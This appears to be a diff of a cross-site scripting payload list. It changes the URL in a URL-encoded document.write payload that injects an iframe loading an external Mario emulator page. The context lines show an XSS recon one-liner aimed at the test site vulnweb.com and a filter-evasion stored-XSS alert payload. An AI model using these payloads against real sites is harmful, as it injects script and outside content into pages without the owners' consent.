@@ -17,7 +17,7 @@ XSS = subfinder -d vulnweb.com -all -silent | httpx -silent | katana -silent | G
 
 
 # Mario :v
-document.write%28%3Ciframe%20src%3D%22http%3A//supermarioemulator.com/Mario.php%22%20height%3D640%20width%3D%22816%22%3E%3C/iframe%3E%29
+document.write%28%3Ciframe%20src%3D%22http%3A//supermarioemulator.com/supermario.php%22%20height%3D640%20width%3D%22816%22%3E%3C/iframe%3E%29
 
 Stored XSS:
 %<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
